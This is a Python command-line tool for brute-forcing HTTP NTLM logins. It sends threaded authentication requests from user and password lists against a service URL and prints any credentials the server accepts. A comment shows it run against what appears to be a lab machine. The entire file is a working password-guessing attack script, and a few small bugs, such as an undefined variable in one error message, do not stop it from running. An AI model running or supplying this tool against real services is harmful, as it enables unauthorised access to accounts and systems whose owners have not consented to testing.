#!/usr/bin/python3

# NTLM Cracking tool
# Óscar Andreu 
import os
import sys
import argparse
import subprocess
import concurrent.futures
import pycurl
import io



password_found = False
quit = False
partial = 0
remains = 0

def checkPassword(url, domain, user, password):
    global password_found
    global partial
    global remains

    if(quit or password_found):
        return

    creds = f"{domain}{user}:{password}"

    curl = pycurl.Curl()
    curl.setopt(pycurl.URL, url)
    curl.setopt(pycurl.SSL_VERIFYPEER, 0)
    curl.setopt(pycurl.HEADER, True)
    curl.setopt(pycurl.NOBODY, True)
    curl.setopt(pycurl.WRITEFUNCTION, lambda bytes: len(bytes))
    curl.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
    curl.setopt(pycurl.USERPWD, creds)
    curl.perform()
    
    statusCode = curl.getinfo(curl.RESPONSE_CODE)      
    curl.close()

    partial += 1
    remains -= 1

    if(partial % 10 == 0):
        print(f"Progress {round(partial/total*100, 4)}%")

    if(statusCode != 401):
        password_found = True
        partial += remains
        print(f'{statusCode} - {creds}')


if __name__ == "__main__":

    parser=argparse.ArgumentParser(
        description='HTTP NTLM cracking tool',
        epilog="")

    parser.add_argument('-p', metavar='<passwordsFile>', help='Passwords file', required=True)
    parser.add_argument('-s', metavar='<serviceURL>', help='Service URL', required=True)

    parser.add_argument('-d', metavar='<domain>', help='Domain name', default="")
    parser.add_argument('-u', metavar='<user>', help='User name', default="")
    parser.add_argument('-U', metavar='<usersFile>', help='Users file', default="")
    parser.add_argument('-v', metavar='<verbose>', help='Show all attemps', default=False)
    parser.add_argument('-t', metavar='<threads>', help='Number of threads, default 5', default=5)

    args = parser.parse_args()
    passFile = args.p
    url = args.s
    verbose = args.v
    threads = int(args.t)
    domain = args.d
    if(args.d):
        domain += "\\"

    # Load users, or single user from args.u o a list of users from args.U
    if(args.u):
        users = [args.u]
    elif(args.U):
        users = open(args.U, "r").read().splitlines()
    else:
        print("You must provide a user name or a file with user names")
        print()
        parser.print_help()
        sys.exit()

    try:
        passwords = open(passFile, "r", errors='replace').read().splitlines()        
    except IOError:        
        print(f'could not open the password file: {file}')
        sys.exit()

    # python3 http_ntlm_brute.py -s http://devops.worker.htb -u nathen -p passwords -d worker     
    print("""\

     _   _ _____ _____ ____    _   _ _____ _     __  __                       _    _               _              _ 
    | | | |_   _|_   _|  _ \  | \ | |_   _| |   |  \/  |   ___ _ __ __ _  ___| | _(_)_ __   __ _  | |_ ___   ___ | |
    | |_| | | |   | | | |_) | |  \| | | | | |   | |\/| |  / __| '__/ _` |/ __| |/ | | '_ \ / _` | | __/ _ \ / _ \| |
    |  _  | | |   | | |  __/  | |\  | | | | |___| |  | | | (__| | | (_| | (__|   <| | | | | (_| | | || (_) | (_) | |
    |_| |_| |_|   |_| |_|     |_| \_| |_| |_____|_|  |_|  \___|_|  \__,_|\___|_|\_|_|_| |_|\__, |  \__\___/ \___/|_|
                                                                                            |___/                                  

    """)

    total = len(passwords) * len(users)

    print(f'Number of combinations: {total}')

    try:
        for user in users:
            password_found = False
            remains = len(passwords)

            with concurrent.futures.ThreadPoolExecutor(max_workers = threads) as executor:                
                for password in passwords:
                    future = executor.submit(checkPassword, url=url, domain=domain, user=user, password=password)                


    except KeyboardInterrupt:
        quit = True



